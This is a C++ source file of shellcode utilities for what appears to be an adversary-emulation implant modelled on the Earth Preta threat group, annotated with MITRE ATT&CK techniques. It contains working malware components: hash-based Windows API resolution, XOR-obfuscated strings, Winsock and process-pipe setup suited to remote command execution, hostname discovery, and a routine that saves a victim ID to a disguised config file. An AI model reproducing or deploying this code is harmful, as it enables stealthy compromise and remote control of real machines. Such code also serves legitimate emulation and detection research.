#include "shellcode_util.hpp"
#include "fnv1a.hpp"
#include <al/import.hpp>

/*
 * FetchFunctions:
 *      About:
 *          Dynamically resolves Windows API functions for use throughout shellcode.
 *          Uses the FNV-1A hash algorithm to compare API names.
 *      MITRE ATT&CK Techniques:
 *          T1106: Native API
 *          T1027.007: Obfuscated Files or Information: Dynamic API Resolution
 *      CTI:
 *          https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html
 */
DWORD FetchFunctions(func_pointers* fp) {
    fp->h_kernel32 = GM(L"KERNEL32.DLL", by_ror13);
    if (!fp->h_kernel32) {
        return FAIL_GET_KERNEL32;
    }

    fp->h_ntdll = GM(L"NTDLL.DLL", by_ror13);
    if (!fp->h_ntdll) {
        return FAIL_GET_NTDLL;
    }

    fp->fp_LoadLibraryW = GP(fp->h_kernel32, LoadLibraryW, by_fnv1a);
    if (!fp->fp_LoadLibraryW) {
        return FAIL_GET_LOADLIBRARYW;
    }

    fp->h_user32 = fp->fp_LoadLibraryW(L"user32.dll"_xor);
    if (!fp->h_user32) {
        return FAIL_LOAD_USER32;
    }

    fp->h_ws2_32 = fp->fp_LoadLibraryW(L"ws2_32.dll"_xor);
    if (!fp->h_ws2_32) {
        return FAIL_LOAD_WS2_32;
    }

    fp->h_bcrypt = fp->fp_LoadLibraryW(L"bcrypt.dll"_xor);
    if (!fp->h_bcrypt) {
        return FAIL_LOAD_BCRYPT;
    }

    fp->fp_WSAStartup = al::get_proc<WSAStartup_t>(fp->h_ws2_32, by_fnv1a("WSAStartup"_stack));
    if (!(fp->fp_WSAStartup)) {
        return FAIL_GET_WSAStartup;
    }

    fp->fp_socket = GP(fp->h_ws2_32, socket, by_fnv1a);
    if (!(fp->fp_socket)) {
        return FAIL_GET_SOCKET;
    }

    fp->fp_send = GP(fp->h_ws2_32, send, by_fnv1a);
    if (!(fp->fp_send)) {
        return FAIL_GET_SEND;
    }

    fp->fp_recv = GP(fp->h_ws2_32, recv, by_fnv1a);
    if (!(fp->fp_recv)) {
        return FAIL_GET_RECV;
    }

    fp->fp_connect = al::get_proc<connect_t>(fp->h_ws2_32, by_fnv1a("connect"_stack));
    if (!(fp->fp_connect)) {
        return FAIL_GET_CONNECT;
    }

    fp->fp_WSAGetLastError = GP(fp->h_ws2_32, WSAGetLastError, by_fnv1a);
    if (!(fp->fp_WSAGetLastError)) {
        return FAIL_GET_WSAGETLASTERROR;
    }

    fp->fp_closesocket = GP(fp->h_ws2_32, closesocket, by_fnv1a);
    if (!(fp->fp_closesocket)) {
        return FAIL_GET_CLOSESOCKET;
    }

    fp->fp_WSACleanup = GP(fp->h_ws2_32, WSACleanup, by_fnv1a);
    if (!(fp->fp_WSACleanup)) {
        return FAIL_GET_WSACLEANUP;
    }

    fp->fp_htons = GP(fp->h_ws2_32, htons, by_fnv1a);
    if (!(fp->fp_htons)) {
        return FAIL_GET_HTNOS;
    }

    fp->fp_inet_addr = GP(fp->h_ws2_32, inet_addr, by_fnv1a);
    if (!(fp->fp_inet_addr)) {
        return FAIL_GET_INET_ADDR;
    }

    // kernel32.HeapAlloc is forwarded to ntdll.RtlAllocateHeap
    fp->shared_fp.fp_HeapAlloc = GP(fp->h_ntdll, RtlAllocateHeap, by_fnv1a);
    if (!(fp->shared_fp.fp_HeapAlloc)) {
        return FAIL_GET_HEAPALLOC;
    }

    fp->shared_fp.fp_HeapCreate = GP(fp->h_kernel32, HeapCreate, by_fnv1a);
    if (!(fp->shared_fp.fp_HeapCreate)) {
        return FAIL_GET_HEAPCREATE;
    }

    fp->shared_fp.fp_HeapDestroy = GP(fp->h_kernel32, HeapDestroy, by_fnv1a);
    if (!(fp->shared_fp.fp_HeapDestroy)) {
        return FAIL_GET_HEAPDESTROY;
    }

    fp->shared_fp.fp_HeapFree = GP(fp->h_kernel32, HeapFree, by_fnv1a);
    if (!(fp->shared_fp.fp_HeapFree)) {
        return FAIL_GET_HEAPFREE;
    }

    fp->shared_fp.fp_GetLastError = GP(fp->h_kernel32, GetLastError, by_fnv1a);
    if (!(fp->shared_fp.fp_GetLastError)) {
        return FAIL_GET_GETLASTERROR;
    }

    fp->fp_GetComputerNameA = GP(fp->h_kernel32, GetComputerNameA, by_fnv1a);
    if (!(fp->fp_GetComputerNameA)) {
        return FAIL_GET_GETCOMPUTERNAMEA;
    }

    fp->fp_shutdown = GP(fp->h_ws2_32, shutdown, by_fnv1a);
    if (!(fp->fp_shutdown)) {
        return FAIL_GET_SHUTDOWN;
    }

    fp->shared_fp.fp_CreateFileW = GP(fp->h_kernel32, CreateFileW, by_fnv1a);
    if (!(fp->shared_fp.fp_CreateFileW)) {
        return FAIL_GET_CREATEFILEW;
    }

    fp->shared_fp.fp_CloseHandle = GP(fp->h_kernel32, CloseHandle, by_fnv1a);
    if (!(fp->shared_fp.fp_CloseHandle)) {
        return FAIL_GET_CLOSEHANDLE;
    }

    fp->shared_fp.fp_vsnprintf = GP(fp->h_ntdll, _vsnprintf, by_fnv1a);
    if (!(fp->shared_fp.fp_vsnprintf)) {
        return FAIL_GET_VSNPRINTF;
    }

    fp->shared_fp.fp_snprintf = GP(fp->h_ntdll, _snprintf, by_fnv1a);
    if (!(fp->shared_fp.fp_snprintf)) {
        return FAIL_GET_SNPRINTF;
    }

    fp->shared_fp.fp_GetSystemTime = GP(fp->h_kernel32, GetSystemTime, by_fnv1a);
    if (!(fp->shared_fp.fp_GetSystemTime)) {
        return FAIL_GET_GETSYSTEMTIME;
    }

    fp->shared_fp.fp_SetFilePointer = GP(fp->h_kernel32, SetFilePointer, by_fnv1a);
    if (!(fp->shared_fp.fp_SetFilePointer)) {
        return FAIL_GET_SETFILEPOINTER;
    }

    fp->shared_fp.fp_WriteFile = GP(fp->h_kernel32, WriteFile, by_fnv1a);
    if (!(fp->shared_fp.fp_WriteFile)) {
        return FAIL_GET_WRITEFILE;
    }

    fp->shared_fp.fp_BCryptGenRandom = GP(fp->h_bcrypt, BCryptGenRandom, by_fnv1a);
    if (!(fp->shared_fp.fp_BCryptGenRandom)) {
        return FAIL_GET_BCRYPTGENRANDOM;
    }

    fp->fp_Sleep = GP(fp->h_kernel32, Sleep, by_fnv1a);
    if (!(fp->fp_Sleep)) {
        return FAIL_GET_SLEEP;
    }

    fp->fp_CreateProcessW = GP(fp->h_kernel32, CreateProcessW, by_fnv1a);
    if (!(fp->fp_CreateProcessW)) {
        return FAIL_GET_CREATEPROCESSW;
    }

    fp->fp_GetExitCodeProcess = GP(fp->h_kernel32, GetExitCodeProcess, by_fnv1a);
    if (!(fp->fp_GetExitCodeProcess)) {
        return FAIL_GET_GETEXITCODEPROCESS;
    }

    fp->fp_PeekNamedPipe = GP(fp->h_kernel32, PeekNamedPipe, by_fnv1a);
    if (!(fp->fp_PeekNamedPipe)) {
        return FAIL_GET_PEEKNAMEDPIPE;
    }

    fp->fp_WaitForSingleObject = GP(fp->h_kernel32, WaitForSingleObject, by_fnv1a);
    if (!(fp->fp_WaitForSingleObject)) {
        return FAIL_GET_WAITFORSINGLEOBJECT;
    }

    fp->fp_ReadFile = GP(fp->h_kernel32, ReadFile, by_fnv1a);
    if (!(fp->fp_ReadFile)) {
        return FAIL_GET_READFILE;
    }

    fp->fp_CreatePipe = GP(fp->h_kernel32, CreatePipe, by_fnv1a);
    if (!(fp->fp_CreatePipe)) {
        return FAIL_GET_CREATEPIPE;
    }

    fp->fp_SetHandleInformation = GP(fp->h_kernel32, SetHandleInformation, by_fnv1a);
    if (!(fp->fp_SetHandleInformation)) {
        return FAIL_GET_SETHANDLEINFORMATION;
    }

    fp->fp_GetEnvironmentVariableW = GP(fp->h_kernel32, GetEnvironmentVariableW, by_fnv1a);
    if (!(fp->fp_GetEnvironmentVariableW)) {
        return FAIL_GET_GETENVIRONMENTVARIABLEW;
    }

    return ERROR_SUCCESS;
}

/*
 * pi_widen_str:
 *      Position-independent implementation of converting an ASCII string to a wide char string.
 *      src_size is size of src buffer, in bytes, which may be larger than the actual string length.
 *      dst_size is size of dst buf, in wchar_t.
 *      Will always null-terminate the converted string, even if it means truncating.
 *      For optimal usage, ensure that dst buffer is at least twice as large as src buffer.
 */
void pi_widen_str(const char* src, size_t src_size, wchar_t* dst, size_t dst_size) {
    size_t dst_i = 0;
    size_t dst_size_bytes = dst_size*sizeof(wchar_t);
    char* dst_ptr = reinterpret_cast<char*>(dst);
    pi_memset(dst_ptr, 0, dst_size_bytes);
    for (size_t src_i = 0; src_i < src_size && dst_i < dst_size_bytes && src[src_i]; src_i++) {
        dst_ptr[dst_i] = src[src_i];
        dst_i += sizeof(wchar_t);
    }
    dst[dst_size - 1] = L'\0'; // always null-terminate
}

/*
 * pi_widen_str:
 *      Position-independent implementation of concatenating src to dst wide strings
 *      on top of dst buffer.
 *      dst_size is dst buf size in wchar_t.
 */
void pi_concat_wstrn(wchar_t* dst, size_t dst_size, LPCWSTR src) {
    size_t i = 0;
    size_t j = 0;
    wchar_t curr;
    while (i < dst_size) {
        curr = dst[i];
        if (curr == L'\0') {
            // start overwriting after first null-terminator
            while(j + i < dst_size && src[j] != L'\0') {
                dst[i + j] = src[j];
                j++;
            }

            // Truncate if necessary
            if (j + i >= dst_size) {
                dst[dst_size - 1] = L'\0';
            } else {
                dst[i + j] = L'\0';
            }
            break;
        }
        i++;
    }
}

/*
 * SaveVictimID:
 *      About:
 *          Saves the victim GUID on disk at
 *          %USERPROFILE%\AppData\Roaming\Microsoft\Web.CompressShaders.config.
 *      MITRE ATT&CK Techniques:
 *          T1106: Native API
 *      CTI:
 *          https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html
 *          https://www.trendmicro.com/en_us/research/23/f/behind-the-scenes-unveiling-the-hidden-workings-of-earth-preta.html
 */
DWORD SaveVictimID(sh_context* ctx) {
    wchar_t buf[MAX_PATH];
    DWORD result = ctx->fp.fp_GetEnvironmentVariableW(
        L"USERPROFILE"_xor,
        buf,
        MAX_PATH
    );
    if (result == 0) {
        return ctx->fp.shared_fp.fp_GetLastError();
    }

    // Append path to %USERPROFILE%
    pi_concat_wstrn(buf, MAX_PATH, L"\\AppData\\Roaming\\Microsoft\\Web.CompressShaders.config"_xor);

    HANDLE h_file = ctx->fp.shared_fp.fp_CreateFileW(
        buf,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (h_file == INVALID_HANDLE_VALUE) {
        return ctx->fp.shared_fp.fp_GetLastError();
    }

    result = WriteFileBytes(
        &(ctx->fp.shared_fp),
        h_file,
        reinterpret_cast<char*>(ctx->victim_id),
        sizeof(ctx->victim_id)
    );
    ctx->fp.shared_fp.fp_CloseHandle(h_file);
    return result;
}

/*
 * GetHostname:
 *      About:
 *          Gets current hostname using the GetComputerNameA API call.
 *      Result:
 *          Populates the shellcode context with the current hostname.
 *          Returns 0 on success, otherwise returns an error code.
 *      MITRE ATT&CK Techniques:
 *          T1082: System Information Discovery
 *          T1106: Native API
 *      CTI:
 *          https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html
 *          https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html
 */
DWORD GetHostname(sh_context* ctx) {
    unsigned long buf_len = sizeof(ctx->hostname);
    if (!ctx->fp.fp_GetComputerNameA(ctx->hostname, &buf_len)) {
        return ctx->fp.shared_fp.fp_GetLastError();
    } else {
        // buf_len will contain the number of char copied
        // to destination buff (excluding null byte)
        ctx->hostname_size = buf_len;
    }
    return ERROR_SUCCESS;
}
